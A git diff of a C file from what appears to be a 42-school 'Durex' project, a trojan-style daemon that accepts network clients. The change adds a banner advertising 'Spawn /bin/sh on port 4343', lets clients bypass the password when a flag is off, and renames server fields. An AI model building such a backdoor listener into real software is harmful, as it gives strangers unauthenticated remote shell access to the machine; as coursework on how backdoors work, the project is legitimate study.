@@ -6,7 +6,7 @@
 /*   By: banthony <banthony@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/11/06 16:44:24 by banthony          #+#    #+#             */
-/*   Updated: 2019/11/14 19:30:22 by banthony         ###   ########.fr       */
+/*   Updated: 2019/11/15 15:55:10 by banthony         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -39,21 +39,38 @@ void		send_text(char *text, int socket)
 
 static void		welcome_client(t_client *clt)
 {
-	char *mess;
+	char *durex_header;
+	char *shell_header;
 
-	mess =	"/* ************************************************************************** */\n"
-			"/*                                                        :::      ::::::::   */\n"
-			"/*  \xe2\x98\xa0  - WELCOME TO DUREX - \xe2\x98\xa0"
+	durex_header =	"/* ************************************************************************** */\n"
+					"/*                                                        :::      ::::::::   */\n"
+					"/*  \xe2\x98\xa0  - WELCOME TO DUREX - \xe2\x98\xa0"
 										"                           :+:      :+:    :+:   */\n"
-			"/*                                                    +:+ +:+         +:+     */\n"
-			"/*      * 3 clients max                             +#+  +:+       +#+        */\n"
-			"/*      * Enter 'help' to see all commands        +#+#+#+#+#+   +#+           */\n"
-			"/*                                                     #+#    #+#             */\n"
-			"/*                                                    ###   ########          */\n"
-			"/* ************************************************************************** */\n"
-		"\nDurex>";
-	send_text(mess, clt->socket);
-	clt->granted = true;
+					"/*                                                    +:+ +:+         +:+     */\n"
+					"/*      * 3 clients max                             +#+  +:+       +#+        */\n"
+					"/*      * Enter 'help' to see all commands        +#+#+#+#+#+   +#+           */\n"
+					"/*                                                     #+#    #+#             */\n"
+					"/*                                                    ###   ########          */\n"
+					"/* ************************************************************************** */\n"
+					"\nDurex>";
+	shell_header =	"/* ************************************************************************** */\n"
+					"/*                                                        :::      ::::::::   */\n"
+					"/*  \xe2\x98\xa0  - WELCOME TO DUREX - \xe2\x98\xa0"
+												"                           :+:      :+:    :+:   */\n"
+					"/*                                                    +:+ +:+         +:+     */\n"
+					"/*      * Spawn /bin/sh on port 4343                +#+  +:+       +#+        */\n"
+					"/*                                                +#+#+#+#+#+   +#+           */\n"
+					"/*                                                     #+#    #+#             */\n"
+					"/*                                                    ###   ########          */\n"
+					"/* ************************************************************************** */\n";
+
+	if (!clt->granted)
+	{
+		send_text(durex_header, clt->socket);
+		clt->granted = true;
+	}
+	else
+		send_text(shell_header, clt->socket);
 	durex_log_with(CLIENT_LOG, LOG_INFO, client_prefix, clt);
 }
 
@@ -64,12 +81,12 @@ static t_bool	add_client(t_server *server, int cs, struct sockaddr_in csin)
 
 	new_client.socket = cs;
 	new_client.addr = inet_ntoa(csin.sin_addr);
-	new_client.granted = false;
+	new_client.granted = !server->require_pass;
 	if (!(nc = ft_lstnew(&new_client, sizeof(new_client))))
 	{
-		durex_log(ALLOC_ERR("Connexion aborted.\n"), LOG_WARNING);
-		send_text(ALLOC_ERR("Connexion aborted.\n"), cs);
-		FD_CLR(cs, &server->masterfdset);
+		durex_log(ALLOC_ERR("Connexion aborted."), LOG_WARNING);
+		send_text(ALLOC_ERR("Connexion aborted."), cs);
+		FD_CLR(cs, &server->fdset);
 		close(cs);
 		return (false);
 	}
@@ -79,8 +96,11 @@ static t_bool	add_client(t_server *server, int cs, struct sockaddr_in csin)
 	else
 		ft_lstadd(&server->client_lst, nc);
 
-	send_text(PASS_REQUEST, cs);
-	FD_SET(cs, &server->masterfdset);
+	if (!new_client.granted)
+		send_text(PASS_REQUEST, cs);
+	else
+		welcome_client(&new_client);
+	FD_SET(cs, &server->fdset);
 	server->clients++;
 	durex_log_with(CLIENT_LOGIN, LOG_INFO, client_prefix, &new_client);
 	return (true);
@@ -92,17 +112,17 @@ t_bool	new_client(t_server *server)
 	unsigned int		cs_len;
 	struct sockaddr_in	csin;
 
-	if ((cs = accept(server->srv_sock, (struct sockaddr*)&csin, &cs_len)) < 0)
+	if ((cs = accept(server->socket, (struct sockaddr*)&csin, &cs_len)) < 0)
 	{
 		durex_log(ACCEPT_ERR, LOG_ERROR);
 		durex_log(strerror(errno), LOG_ERROR);
 		return (false);
 	}
-	if (server->clients >= server->max_client)
+	if (server->clients >= server->client_limit)
 	{
 		durex_log(CONNEXION_REFUSED, LOG_INFO);
 		send_text(CONNEXION_REFUSED, cs);
-		FD_CLR(cs, &server->masterfdset);
+		FD_CLR(cs, &server->fdset);
 		close(cs);
 		return (false);
 	}
@@ -131,7 +151,7 @@ t_bool	deco_client(t_client *client, t_server *server)
 		stored_client = (t_client*)elmt->content;
 		if (stored_client->socket == client->socket)
 		{
-			FD_CLR(client->socket, &server->masterfdset);
+			FD_CLR(client->socket, &server->fdset);
 			close(client->socket);
 			durex_log_with(DISCONNECTED, LOG_INFO, client_prefix, client);
 			server->clients--;
@@ -151,7 +171,7 @@ t_bool	deco_client(t_client *client, t_server *server)
 	return (true);
 }
 
-t_bool	create_server(t_server *server, int port, size_t max_client)
+t_bool	create_server(t_server *server, int port, size_t client_limit)
 {
 	int					sock;
 	struct sockaddr_in	sin;
@@ -166,10 +186,9 @@ t_bool	create_server(t_server *server, int port, size_t max_client)
 		return (false);
 	}
 	listen(sock, MAX_PENDING_CLIENT);
-	ft_memset(server, 0, sizeof(t_server));
-	server->max_client = max_client;
+	server->client_limit = client_limit;
 	server->port = port;
-	server->srv_sock = sock;
+	server->socket = sock;
 	return (true);
 }
 
@@ -211,12 +230,12 @@ t_bool	server_loop(t_server *server)
 	fd_set	readfdset;
 
 	FD_ZERO(&readfdset);
-	FD_ZERO(&server->masterfdset);
-	FD_SET(server->srv_sock, &server->masterfdset);
+	FD_ZERO(&server->fdset);
+	FD_SET(server->socket, &server->fdset);
 	durex_log(SERVER_STARTED, LOG_INFO);
 	while (42)
 	{
-		readfdset = server->masterfdset;
+		readfdset = server->fdset;
 		if (select(FD_SETSIZE, &readfdset, NULL, NULL, NULL) < 0)
 		{
 			durex_log(SELECT_ERR, LOG_ERROR);
@@ -230,7 +249,7 @@ t_bool	server_loop(t_server *server)
 			if (FD_ISSET(i, &readfdset) == 0)
 				continue;
 				// If it correspond to the server descriptor, handle a new connexion
-			if (FD_ISSET(server->srv_sock, &readfdset))
+			if (FD_ISSET(server->socket, &readfdset))
 				new_client(server);
 			// Otherwise, handle client data
 			else
